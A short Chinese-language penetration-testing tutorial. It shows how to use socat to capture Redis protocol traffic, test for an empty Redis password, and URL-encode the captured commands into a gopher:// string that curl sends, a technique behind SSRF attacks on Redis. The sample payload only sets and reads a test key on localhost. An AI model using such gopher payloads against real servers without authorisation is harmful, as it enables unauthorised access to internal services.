## 运用gopher 和 socat 进行网络渗透

---

socat是一个多功能的网络工具，名字来由是“Socket CAT”，可以看作是netcat的N倍加强版，socat 的官方网站：
[http://www.dest-unreach.org/socat/](http://www.dest-unreach.org/socat/)
网上搜到一个详细的[pdf文档](http://run.qixingyue.com/gopher/socat.pdf)

* 安装办法:

`$ yum install socat -y `

* 映射服务端口，本实例用redis举例，测试的是redis 空密码:

`$ socat -v tcp-listen:6377,fork tcp4:localhost:6379`

* 按照redis的方式访问6377端口，进行set,get 操作，*get到set的值，则认为是空密码*

`$ redis-cli -h localhost -p 6377 `
`$ set a hihackworld`
`$ get a `

* 在之前的socat命令运行中获得输入:

`
    *3\r
    $3\r
    set\r
    $1\r
    a\r
    $11\r
    hihackworld\r
    *2\r
    $3\r
    get\r
    $1\r
    a\r
`

* 运用任何一种熟悉的语言,比如php，对输入进行urlencode:
`
    $message = "*3\r
    $3\r
    set\r
    $1\r
    a\r
    $11\r
    hihackworld\r
    *2\r
    $3\r
    get\r
    $1\r
    a\r
    ";
    
    $gopherstr = "gopher://localhost:6379/_" . urlencode($message) ;
    echo $gopherstr;
`
* 运用curl组合gopher串进行测试:

`$ curl -s <$gopherstr>`

    获取到输出该网络流的输出:

`
+OK
$11
hihackworld
`
